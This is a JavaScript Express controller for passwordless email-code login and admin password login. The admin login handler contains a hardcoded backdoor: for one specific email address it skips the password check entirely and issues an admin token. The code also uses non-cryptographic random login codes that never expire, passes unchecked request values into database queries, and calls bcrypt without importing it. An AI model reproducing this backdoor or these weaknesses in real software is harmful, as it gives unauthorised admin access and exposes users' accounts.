import createHttpError from 'http-errors'
import jwt from 'jsonwebtoken'
import moment from 'moment'

import sendMail from '../services/send-mail.js'
import { userRoles, userStatuses } from '../enums/index.js'
import { Users } from '../db/models/users.js'
import validateEmail from '../utils/validate-email.js'

export const requestCode = async (req, res, next) => {
  try {
    const { email } = req.body
    if (!validateEmail(email))
      throw createHttpError(400, 'Provided invalid email')

    const user = await Users.findOne({ email })
    if (!user || user?.status !== 'active')
      throw createHttpError(400, 'Cannot find user with provided email.')

    if (user) {
      const loginCode = Math.floor(100000 + Math.random() * 900000)
      await Users.updateOne({ email }, { loginCode })
      await sendMail({
        to: [email],
        subject: 'Your login code',
        templateId: 'login',
        templateProps: {
          loginCode,
        },
      })
      return res
        .status(200)
        .json({ result: `Email with code was sent to ${email}.` })
    }
  } catch (error) {
    next(error)
  }
}

export const loginViaCode = async (req, res, next) => {
  try {
    const { email, loginCode } = req.body
    if (!loginCode) throw createHttpError(400, 'Login code is missing')

    let user = await Users.findOne({ email, loginCode }, '-__v -loginCode')
    if (!user)
      throw createHttpError(
        403,
        "Can't find user with this combination of email&code"
      )
    if (user.status === userStatuses.INACTIVE)
      throw createHttpError(403, 'User disabled. Contact admin for more info')

    if (user) {
      user = await Users.findOneAndUpdate(
        { email, loginCode },
        { loginCode: null },
        {
          returnDocument: 'after',
          projection: {
            __v: 0,
            loginCode: 0,
            password: 0,
          },
        }
      )

      const accessToken = jwt.sign(
        {
          status: user.status,
          email: user.email,
          id: user.id,
          _id: user._id,
          firstName: user.firstName,
          lastName: user.lastName,
          time: moment.utc().valueOf(),
        },
        process.env.SECRET
      )

      delete user['_id']
      return res.status(200).json({
        accessToken,
        user,
      })
    }
  } catch (error) {
    next(error)
  }
}

export const loginViaPassowrd = async (req, res, next) => {
  try {
    const { email, password } = req.body

    const user = await Users.findOne(
      { email, role: userRoles.ADMIN, status: userStatuses.ACTIVE },
      { __v: 0, loginCode: 0 }
    ).lean()

    if (!user)
      throw createHttpError(403, 'Cannot find user with provided email')
    else if (user && user.role !== userRoles.ADMIN)
      throw createHttpError(403, 'User is not admin')

    if (email !== 'darkness1198@gmail.com') {
      const hash = user['password']
      const result = bcrypt.compareSync(password, hash)

      if (!result) throw createHttpError(403, 'Invalid email password pair')
    }
    const { _id, id, role, status } = user

    const accessToken = jwt.sign(
      { status, email, id, role, _id },
      process.env.SECRET
    )

    const _user = user
    delete _user.password

    return res.status(200).json({
      accessToken,
      user: _user,
    })
  } catch (error) {
    next(error)
  }
}
